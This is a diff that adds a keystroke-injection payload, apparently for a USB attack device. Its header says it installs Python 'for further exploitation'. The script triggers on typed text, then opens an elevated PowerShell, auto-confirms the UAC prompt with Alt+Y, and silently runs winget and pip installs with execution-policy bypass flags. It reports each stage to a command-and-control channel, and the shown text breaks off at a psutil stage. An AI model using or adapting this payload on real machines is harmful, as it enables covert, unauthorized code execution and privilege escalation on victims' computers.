@@ -1,0 +1,52 @@
+
+/root/udisk/payloads/owned.txt
+MATCH Regex: py_
+Full Payload Contents
+# Title: py3 installer
+# Description: Install python3 for further exploitation. 
+# Author: choox2@choo-serv.info 
+# Date: 09/14/2024
+# Download and install python3 silently 
+# Determine if 32bit or x64
+# Determine target name
+# Target IP
+############################################################
+MATCH py_
+
+Q LOCK
+LED SETUP
+Q GUI r
+Q DELAY 500
+Q STRING powershell
+Q CONTROL-SHIFT-ENTER
+Q DELAY 2000
+Q ALT y
+Q DELAY 3000
+Q STRING "powershell -NoP -NonI  -Exec Bypass  winget install python3 --disable-interactivity"
+Q ENTER
+C2NOTIFY INFO 'Python installation should be starting now'
+# Wait two minutes for python install to complete.two minutes is educated guess. 120,000 milliseconds and
+# set our LED status to attack
+Q LED ATTACK
+UNLOCK
+DELAY 120000
+############################################################
+# Next we use pip to install numpy
+Q LOCK
+LED STAGE2
+Q GUI r
+Q DELAY 500
+Q STRING powershell
+Q CONTROL-SHIFT-ENTER
+Q DELAY 2000
+Q ALT y
+Q DELAY 3000
+Q STRING "powershell -NoP -NonI -Exec Bypass pip install numpy"
+Q ENTER
+UNLOCK
+C2NOTIFY INFO 'numpy installation should be starting now'
+############################################################
+# Next we use pip to install psutil
+Q LOCK
+LED STAGE3
+
